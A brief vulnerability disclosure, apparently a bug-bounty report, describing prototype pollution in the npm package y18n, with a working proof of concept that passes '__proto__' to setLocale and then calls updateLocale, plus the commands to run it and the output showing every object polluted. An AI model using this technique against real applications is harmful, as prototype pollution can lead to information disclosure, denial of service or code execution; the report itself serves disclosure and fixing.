# Description

`y18n` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
const y18n = require('y18n')();
var obj = {}
console.log("Before : " + obj.polluted);
y18n.setLocale('__proto__');
y18n.updateLocale({polluted: 'Yes! Its Polluted'});
console.log("After : " + {}.polluted);
```

2. Execute the following commands in another terminal:

```bash
npm i y18n # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
